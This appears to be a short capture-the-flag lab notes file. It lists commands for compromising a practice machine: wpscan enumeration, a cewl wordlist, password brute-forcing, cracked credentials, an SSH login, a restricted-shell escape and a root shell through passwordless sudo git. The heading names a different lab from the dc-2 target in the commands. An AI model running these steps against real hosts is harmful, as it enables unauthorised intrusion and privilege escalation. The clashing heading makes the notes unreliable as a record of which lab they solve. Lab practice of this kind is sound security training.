----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# FunboxRookie
# 27/1/2023

----------------------------------------------------
# nmap result / exploitation
----------------------------------------------------
```


wpscan --url //dc-2 --enumerate p --enumerate t --enumerate u
cewl http://dc-2/ > password
wpscan --url http://dc-2 -U users -P password


ssh tom@192.168.112.194 -p 7744  

jerry: adipiscing
tom: parturient
ssh tom@192.168.112.194 -p 7744  
set shell=/bin/bash
export PATH=/bin:/usr/bin:$PATH

su jerry
sudo -l
(root) NOPASSWD: /usr/bin/git
sudo git -p help config
!/bin/sh
```
